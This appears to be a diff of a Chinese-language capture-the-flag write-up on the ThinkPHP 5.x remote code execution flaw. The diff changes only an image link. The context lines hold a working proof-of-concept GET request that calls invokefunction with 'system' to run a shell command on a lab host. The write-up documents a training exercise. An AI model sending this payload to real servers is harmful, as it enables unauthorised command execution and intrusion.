@@ -13,7 +13,7 @@ ThinkPHP 5.x < ThinkPHP 5.1.31<= ThinkPHP 5.0.23
 
 1、打开靶场、抓包分析，下面是poc，拿到flag成功。
 
-![image-20200821155114277](.\image-20200821155114277.png)
+![1](./1.png)
 ```
 GET /index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/tmp HTTP/1.1
 Host: 118.193.36.37:28446
